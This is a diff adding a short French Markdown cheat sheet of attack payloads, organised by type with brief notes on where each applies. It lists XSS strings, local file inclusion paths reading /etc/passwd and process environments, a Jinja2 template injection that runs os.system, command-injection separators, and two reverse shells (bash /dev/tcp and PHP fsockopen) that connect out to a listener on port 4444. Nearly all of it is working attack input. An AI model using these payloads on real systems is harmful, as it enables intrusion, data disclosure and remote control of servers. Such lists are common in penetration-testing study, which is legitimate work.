@@ -1,0 +1,56 @@
+# Payloads utiles - Par type d’attaque, avec explications
+
+Un payload est un petit bout de code utilisé pour tester ou exploiter une vulnérabilité.
+
+---
+
+🔸 XSS (Exécution JS côté client)
+Exemples :
+- <script>alert(1)</script>
+- <img src=x onerror=alert('XSS')>
+- <svg/onload=alert(1)>
+
+Utilisation :
+- Champs de formulaire, commentaires, URL
+
+---
+
+🔸 LFI (Lecture de fichier local)
+Exemples :
+- ../../../../etc/passwd
+- php://filter/convert.base64-encode/resource=index.php
+- /proc/self/environ
+
+Utilisation :
+- Inclusion de fichiers via un paramètre d’URL : page.php?file=
+
+---
+
+🔸 SSTI (Injection de template côté serveur)
+Exemples :
+- {{7*7}} (Jinja2)
+- {{self.__init__.__globals__.os.system('ls')}}
+
+Utilisation :
+- Champs calculés dynamiquement, systèmes de templating
+
+---
+
+🔸 Command Injection
+Exemples :
+- ; whoami
+- && id
+- `uname -a`
+
+Utilisation :
+- Champs utilisés dans une commande (ping, mail, etc.)
+
+---
+
+🔸 Reverse Shell (Prise de contrôle distante)
+Exemples :
+- bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
+- php -r '$sock=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Utilisation :
+- Si une exécution de commande est possible
